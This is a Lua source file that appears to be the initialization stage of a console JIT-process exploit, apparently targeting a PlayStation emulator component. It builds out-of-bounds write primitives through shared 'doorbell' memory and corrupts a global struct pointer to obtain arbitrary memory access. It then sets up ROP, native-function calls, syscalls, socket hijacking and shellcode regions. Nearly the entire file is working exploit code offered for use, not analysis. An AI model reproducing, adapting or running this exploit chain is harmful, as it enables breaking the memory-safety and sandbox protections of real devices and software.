require "jit_rop"
require "jit_func"
require "jit_memory"
require "jit_syscall"
require "jit_misc"

-- oob2 can write somewhat controlled value to 16 byte aligned memory address
-- But we will only use this to write 00 00 00 00 00 00 00 00 xx xx xx xx xx xx 00 00
local function oob2_write(target_address, target_value, pc)
    if oob_lock then
        return
    end
    -- Check 5th byte is 0 before proceeding
    -- THIS NEEDS FIX
    if read8(DOOR3_SHM + 0x04) ~= 0 then
        send_notification("ERROR: 5th byte is not 0, aborting OOB2")
        return
    end

    if target_value > 0xFFFFFEE then
        send_notification("ERROR: target_value " .. to_hex(target_value) .. " exceeds 28bit")
        return
    end

    local diff = target_address - DOOR3_SHM - 0x10A0
    if (diff & 0xF) ~= 0 then
        send_notification("ERROR: target_address not 16-byte aligned")
        return
    end

    local idx = (diff // 16) & 0xFFFFFFFF

    -- 0x1FFFFFFFFFFF -> 0xFFFFFEE
    -- THIS NEEDS FIX (2)
    local write_value = (target_value & 0xFFFF000) * 0x200
                      + (((target_value >> 4) & 0xF) + 1) * 0x10
                      + ((target_value & 0xF) > 0 and (target_value & 0xF) + 1 or 0)

    if target_value == 0 then
        write_value = 0
    end
    
    -- NOTE : To write same write_value multiple times, we need to change PC at DOOR3_SHM + 0x10
    write32(DOOR3_SHM + 0x08, 0x1)
    write64(DOOR3_SHM + 0x20, target_value)
    write64(DOOR3_SHM + 0x28, 0x2000000)
    write32(DOOR3_SHM + 0x10, pc) -- safe values are (0,1,2,3,7,10,11,12 ...)
    write32(DOOR3_SHM + 0x48, 0)
    write32(DOOR3_SHM + 0x1090, idx)
    write32(DOOR3_SHM + 0x0C, 0x812)
    syscall.write(ORG_MAIN_SOCK, "3", 1)
    
    while read32(DOOR3_SHM + 0x08) ~= 0 do 
        -- Add micro bump to make GC happy
        microsleep(10000)
    end
end

-- oob3 and oob4 can write vu0 or vu1 jit buffer pointer to arbitrary address
-- if (target address - 0x8) has DWORD 0
local function oob3_write(target_address, index)
    if oob_lock then
        return
    end
    -- qword_1BAF10
    write32(DOOR3_SHM + 0x08, 0x1) -- sub_149110 thread unlock
    write32(DOOR3_SHM + 0x0C, 0x812) -- sub_154A60 case 2066 
    write32(DOOR3_SHM + 0x10, 12) -- safe value
    write32(DOOR3_SHM + 0x14, index)
    write64(DOOR3_SHM + 0x38, target_address - 0x8)
    
    syscall.write(ORG_MAIN_SOCK, "3", 1)
    
    while read32(DOOR3_SHM + 0x08) ~= 0 do 
        -- Add micro bump to make GC happy
        microsleep(10000)
    end
end

local function oob4_write(target_address, index)
    if oob_lock then
        return
    end
    -- qword_1BAF18
    write32(DOOR4_SHM + 0x08, 0x1) -- sub_1491E0 thread unlock
    write32(DOOR4_SHM + 0x0C, 0x812) -- sub_163760 case 2066 
    write32(DOOR4_SHM + 0x10, 12) -- safe value
    write32(DOOR4_SHM + 0x14, index)
    write64(DOOR4_SHM + 0x38, target_address - 0x8)
    
    syscall.write(ORG_MAIN_SOCK, "4", 1)
    
    while read32(DOOR4_SHM + 0x08) ~= 0 do 
        -- Add micro bump to make GC happy
        microsleep(10000)
    end
end

-- Main jit exploit that overwrites doorbell 3 vu0 global struct pointer
-- at qword_1BAF10 to bridge memory we control
-- qword_1BAF10 - 0x8 has DWORD 0
local function overwrite_DOOR3_GLOBAL()
    if oob_lock then
        return true
    end
    
    -- initialize
    oob3_write(SCRATCH_BASE, 0)
    oob4_write(SCRATCH_BASE + 0x50, 0);

    -- These indexes are used to calculate
    --    v20 = 0x30LL * indexes;
    --    v21 = *(_QWORD *)(*(_QWORD *)(qword_1BAF10 + 0x100) + 8LL * **(_DWORD **)(qword_1BAF10 + 0x15888));
    --    if ( *(_DWORD *)(v21 + v20 + 0x18) )
    --
    -- I have manually found safe index values that return jit buffer pointer reliably
    local indexes = {0x0, 0x3, 0x1c, 0x41, 0x44, 0x5c, 0x60, 0x62, 0x70, 0x77, 0x78}
    
    local last_digit = nil
        
    -- write all
    for i, attempt in ipairs(indexes) do
        write64(SCRATCH_BASE + 0x100 - 0x8 + i * 0x100, 0x0)
        oob4_write(SCRATCH_BASE + 0x100 + i * 0x100, attempt)
    end
    
    -- read all into cache
    local cached = {}
    local max_val = 0
    local max_val_index = nil
    for i, attempt in ipairs(indexes) do
        local val = read64(SCRATCH_BASE + 0x100 + i * 0x100)
        local N = val & 0xF
        cached[i] = { val = val, N = N, attempt = attempt }
        if val > max_val then
            max_val = val
            max_val_index = attempt
        end
    end
    
    -- find NEW_DOOR3_GLOBAL (skip max_val_index)
    -- For some reason last_digit 0xC should also work but it crashes
    for i, entry in ipairs(cached) do
        if entry.attempt ~= max_val_index then
            if entry.N == 6 then
                if (read32(entry.val + 0x108) & 0xFFFF0000 ~= 0) then
                    NEW_DOOR3_GLOBAL = entry.val
                    last_digit = entry.N
                    found_index = entry.attempt
                    break
                end
            elseif entry.N == 7 then
                if (read32(entry.val + 0x108) & 0xFFFFFF00 ~= 0) then
                    NEW_DOOR3_GLOBAL = entry.val
                    last_digit = entry.N
                    found_index = entry.attempt
                    break
                end
            elseif entry.N >= 8 and entry.N <= 0xB then
                if (read32(entry.val + 0x108) ~= 0) then
                    NEW_DOOR3_GLOBAL = entry.val
                    last_digit = entry.N
                    found_index = entry.attempt
                    break
                end
            end
        end
    end
    
    if NEW_DOOR3_GLOBAL == nil then
        return false, "ERROR: No valid NEW_DOOR3_GLOBAL pointer found after all attempts\nBad luck, restart the application to retry"
    end
    
    -- if PLATFORM ~= "PS4" then
        -- send_notification("NEW_DOOR3_GLOBAL : " .. to_hex(NEW_DOOR3_GLOBAL) .. "\nIndex : " .. string.format("0x%X", found_index))
    -- end
    
    -- find OOB_ARRAY_POINTER (skip max_val_index and found_index)
    for i, entry in ipairs(cached) do
        if entry.attempt ~= found_index and entry.attempt ~= max_val_index then
            local N = entry.N
            if N == 0 or N == 0xE or N == 0xF then
                OOB_ARRAY_POINTER = entry.val
                last_digit2 = N
                found_index2 = entry.attempt
            end
        end
    end
    
    if OOB_ARRAY_POINTER == nil then
        return false, "ERROR: No valid OOB_ARRAY_POINTER pointer found after all attempts\nBad luck, restart the application to retry"
    end
    
    -- if PLATFORM ~= "PS4" then
        -- send_notification("OOB_ARRAY_POINTER : " .. to_hex(OOB_ARRAY_POINTER) .. "\nIndex : " .. string.format("0x%X", found_index2))
    -- end
    
    if last_digit == 6 or last_digit == 7 then
    
        oob2_write(((NEW_DOOR3_GLOBAL + 0xF8) & ~0xF),     0x0, 1)
        if read64((NEW_DOOR3_GLOBAL + 0xF8) & ~0xF) ~= 0x0000000000000000 or (read64(((NEW_DOOR3_GLOBAL + 0xF8) & ~0xF) + 8) & 0x000000000000FFFF) ~= 0x0000000000000000 then
            return false, ("oob2_write 1 failed: " .. to_hex(read64((NEW_DOOR3_GLOBAL + 0xF8) & ~0xF)) .. "\n" .. to_hex(read64(((NEW_DOOR3_GLOBAL + 0xF8) & ~0xF) + 8)))
        end
        
        oob2_write(((NEW_DOOR3_GLOBAL + 0x178) & ~0xF),    0x0, 2)
        if read64((NEW_DOOR3_GLOBAL + 0x178) & ~0xF) ~= 0x0000000000000000 or (read64(((NEW_DOOR3_GLOBAL + 0x178) & ~0xF) + 8) & 0x000000000000FFFF) ~= 0x0000000000000000 then
            return false, ("oob2_write 2 failed: " .. to_hex(read64((NEW_DOOR3_GLOBAL + 0x178) & ~0xF)) .. "\n" .. to_hex(read64(((NEW_DOOR3_GLOBAL + 0x178) & ~0xF) + 8)))
        end
        
    end
    
    oob2_write(((NEW_DOOR3_GLOBAL + 0x100) & ~0xF),    0x0, 3)
    if read64((NEW_DOOR3_GLOBAL + 0x100) & ~0xF) ~= 0x0000000000000000 or (read64(((NEW_DOOR3_GLOBAL + 0x100) & ~0xF) + 8) & 0x000000000000FFFF) ~= 0x0000000000000000 then
        return false, ("oob2_write 3 failed: " .. to_hex(read64((NEW_DOOR3_GLOBAL + 0x100) & ~0xF)) .. "\n" .. to_hex(read64(((NEW_DOOR3_GLOBAL + 0x100) & ~0xF) + 8)))
    end
    
    oob2_write(((NEW_DOOR3_GLOBAL + 0x180) & ~0xF),    0x0, 7)
    if read64((NEW_DOOR3_GLOBAL + 0x180) & ~0xF) ~= 0x0000000000000000 or (read64(((NEW_DOOR3_GLOBAL + 0x180) & ~0xF) + 8) & 0x000000000000FFFF) ~= 0x0000000000000000 then
        return false, ("oob2_write 7 failed: " .. to_hex(read64((NEW_DOOR3_GLOBAL + 0x180) & ~0xF)) .. "\n" .. to_hex(read64(((NEW_DOOR3_GLOBAL + 0x180) & ~0xF) + 8)))
    end
    
    -- *(OOB_ARRAY_POINTER) should have value QWORD 0
    if last_digit2 == 0 then
        -- QWORD fits entirely within one aligned block
        oob2_write((OOB_ARRAY_POINTER & ~0xF),          0x0, 10)
        if read64(OOB_ARRAY_POINTER & ~0xF) ~= 0x0000000000000000 or (read64((OOB_ARRAY_POINTER & ~0xF) + 8) & 0x000000000000FFFF) ~= 0x0000000000000000 then
            return false, ("oob2_write 10 failed: " .. to_hex(read64(OOB_ARRAY_POINTER & ~0xF)) .. "\n" .. to_hex(read64((OOB_ARRAY_POINTER & ~0xF) + 8)))
        end
 
    elseif last_digit2 == 0xE or last_digit2 == 0xF then
        -- QWORD straddles two aligned blocks
        oob2_write((OOB_ARRAY_POINTER & ~0xF),              0x0, 10)
        oob2_write(((OOB_ARRAY_POINTER + 0x10) & ~0xF),     0x0, 11)
        if read64(OOB_ARRAY_POINTER & ~0xF) ~= 0x0000000000000000 or (read64((OOB_ARRAY_POINTER & ~0xF) + 8) & 0x000000000000FFFF) ~= 0x0000000000000000 then
            return false, ("oob2_write 10 failed: " .. to_hex(read64(OOB_ARRAY_POINTER & ~0xF)) .. "\n" .. to_hex(read64((OOB_ARRAY_POINTER & ~0xF) + 8)))
        end
        if read64(((OOB_ARRAY_POINTER + 0x10) & ~0xF)) ~= 0x0000000000000000 or (read64(((OOB_ARRAY_POINTER + 0x10) & ~0xF) + 8) & 0x000000000000FFFF) ~= 0x0000000000000000 then
            return false, ("oob2_write 11 failed: " .. to_hex(read64(((OOB_ARRAY_POINTER + 0x10) & ~0xF))) .. "\n" .. to_hex(read64(((OOB_ARRAY_POINTER + 0x10) & ~0xF) + 8)))
        end
    end
    
    if read64(OOB_ARRAY_POINTER) ~= 0 then
        return false, ("ERROR: read64(OOB_ARRAY_POINTER) is not 0\n" .. to_hex(read64(OOB_ARRAY_POINTER)))
    end

    if read32(NEW_DOOR3_GLOBAL + 0xF8) ~= 0 then
        return false, ("ERROR: read32(NEW_DOOR3_GLOBAL + 0xF8) is not 0\n" .. to_hex(read32(NEW_DOOR3_GLOBAL + 0xF8)))
    end

    if read32(NEW_DOOR3_GLOBAL + 0x178) ~= 0 then
        return false, ("ERROR: read32(NEW_DOOR3_GLOBAL + 0x178) is not 0\n" .. to_hex(read32(NEW_DOOR3_GLOBAL + 0x178)))
    end
    
    oob4_write(NEW_DOOR3_GLOBAL + 0x100, found_index2)
    oob4_write(NEW_DOOR3_GLOBAL + 0x180, max_val_index)
    
    if read32(NEW_DOOR3_GLOBAL + 0x108) == 0 then
        return false, ("ERROR: read32(NEW_DOOR3_GLOBAL + 0x108) is 0\n" .. to_hex(read32(NEW_DOOR3_GLOBAL + 0x108)))
    end
    
    if read64(read64(NEW_DOOR3_GLOBAL + 0x100)) ~= 0 then
        return false, ("ERROR: read64(read64(NEW_DOOR3_GLOBAL + 0x100) is not 0\n" .. to_hex(read64(read64(NEW_DOOR3_GLOBAL + 0x100))))
    end

    OOB_ARRAY_INDEX = ((SCRATCH_BASE + 0x1000) // 0x30) + 1
    OOB_ARRAY_BASE = OOB_ARRAY_INDEX * 0x30
    OOB_SCRATCH_BASE = SCRATCH_BASE + 0x2000

    -- Overwrite qword_1BAF10 and lock all oob write functions
    oob4_write(JIT_BASE + 0x1BAF10, found_index)
    oob_lock = true

    -- Overwrite qword_1BAF10 again while oob3 write runs with corrupted qword_1BAF10
    write64(OOB_ARRAY_BASE, OOB_ARRAY_BASE + 0x100)
    write64(OOB_ARRAY_BASE + 0x10, OOB_ARRAY_BASE + 0x200)
    write32(OOB_ARRAY_BASE + 0x18, 0x1000)
    write64(OOB_ARRAY_BASE + 0x100, OOB_SCRATCH_BASE)
    write64(OOB_ARRAY_BASE + 0x200, 0)
    write64(OOB_ARRAY_BASE + 0x208, 0)    
    
    write32(DOOR3_SHM + 0x08, 0x1) -- sub_149110 thread unlock
    write32(DOOR3_SHM + 0x0C, 0x812) -- sub_154A60 case 2066 
    write32(DOOR3_SHM + 0x10, OOB_ARRAY_INDEX)
    write32(DOOR3_SHM + 0x14, OOB_ARRAY_INDEX)
    write64(DOOR3_SHM + 0x38, (JIT_BASE + 0x1BAF10) - 0x8)

    -- Fire doorbell 3
    syscall.write(ORG_MAIN_SOCK, "3", 1)
    
    while read32(DOOR3_SHM + 0x08) ~= 0 do 
        -- Add micro bump to make GC happy
        microsleep(10000)
    end
    
    return true
end


function jit_init() 

    -- send_notification("Initializing JIT exploit...")

    -- qword_1B8460
    BRIDGE_BASE = read64(EBOOT_BASE + 0x3A19C0)
    BRIDGE_BASE_SIZE = 0x9D4000
    
    SCRATCH_BASE = BRIDGE_BASE + 0x30000
    
    ORG_MAIN_SOCK = read32(EBOOT_BASE + 0x3A1A30)
    
    -- qword_1BC4A0
    DOOR3_SHM = BRIDGE_BASE + 0x9C83F0
    -- qword_1BC4A8
    DOOR4_SHM = BRIDGE_BASE + 0x9CBDA0
    
    JIT_BASE = read64(DOOR3_SHM) - 0x1B41E8

    local status, errmsg = overwrite_DOOR3_GLOBAL()
    if not status then
        return false, errmsg
    end
    
    JIT_STRING_SCRATCH = OOB_SCRATCH_BASE + 0x30000

    jit_init_rop()
    
    jit_init_native_functions()
    
    jit_syscall.init()
    
    local sv = OOB_SCRATCH_BASE + 0x6500
    local socketpair_ret = jit_syscall.socketpair(AF_UNIX, SOCK_STREAM, 0, sv)
    if socketpair_ret < 0 then
        return false, "jit_syscall.socketpair failed: " .. jit_get_error_string()
    end
    local sock0, sock1 = read32(sv), read32(sv + 4)

    ORG_JIT_SOCK = jit_read32(JIT_BASE + 0x1B8468)
    
    -- setup for jit_send_recv_fd
    smsg_control = OOB_SCRATCH_BASE + 0x6510
    smsg_data = OOB_SCRATCH_BASE + 0x6600
    smsg_iov = OOB_SCRATCH_BASE + 0x6650
    smsg_msg = OOB_SCRATCH_BASE + 0x6800
    
    -- This terminates thread that holds ORG_MAIN_SOCK with read syscall
    -- write from compiler when doorbell 3 ends might behave weird later
    scePthreadCancel(read64(THREAD_HANDLE_RUNTIME_BRIDGE))
    
    NEW_MAIN_SOCK = jit_send_recv_fd(sock1, ORG_JIT_SOCK, ORG_MAIN_SOCK)
    if (NEW_MAIN_SOCK < 0) then
        return false, "jit_send_recv_fd error"
    end
    
    NEW_JIT_SOCK = sock0
    
    IPU_PROG_BASE = BRIDGE_BASE + 0x9D4000
    IPU_PROG_SIZE = 0x40000
    
    -- Safe write address = + 0x4000 (?)
    EE_PROG_BASE = IPU_PROG_BASE + 0x40000
    EE_PROG_SIZE = 0x2000000
    
    -- Safe write address = + 0x4000 (?)
    IOP_PROG_BASE = EE_PROG_BASE + 0x2000000
    IOP_PROG_SIZE = 0x800000

    -- Safe write address = + 0x8000 (?)
    VU0_PROG_BASE = IOP_PROG_BASE + 0x800000
    VU0_PROG_SIZE = 0x800000
    
    -- Safe write address = + 0x8000 (?)
    VU1_PROG_BASE = VU0_PROG_BASE + 0x800000
    VU1_PROG_SIZE = 0x1000000
    
    VU0_HEAP_BASE = VU1_PROG_BASE + 0x1000000
    VU0_HEAP_SIZE = 0x100000
    
    VU1_HEAP_BASE = VU0_HEAP_BASE + 0x100000
    VU1_HEAP_SIZE = 0x400000
    
    -- Safe shellcode address
    SHELLCODE_SCRATCH = SCRATCH_BASE + 0x90000
    SHELLCODE_BASE = EE_PROG_BASE + 0x10000
    
    send_notification("JIT exploit initialized")
    return true
end



